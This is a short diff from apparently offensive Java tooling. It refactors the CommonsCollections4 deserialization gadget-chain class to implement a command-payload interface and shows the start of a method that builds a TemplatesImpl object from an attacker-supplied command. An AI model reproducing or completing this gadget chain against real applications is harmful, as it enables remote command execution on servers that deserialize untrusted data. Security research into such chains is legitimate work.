@@ -12,7 +12,7 @@ import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
 import org.apache.commons.collections4.functors.InstantiateTransformer;
 
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
@@ -26,7 +26,8 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
  */
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 @Authors({Authors.FROHOFF})
-public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {
+public class CommonsCollections4 implements CommandObjectPayload<Queue<Object>>
+{
 
 	public Queue<Object> getObject(final String command) throws Exception {
 		Object templates = Gadgets.createTemplatesImpl(command);
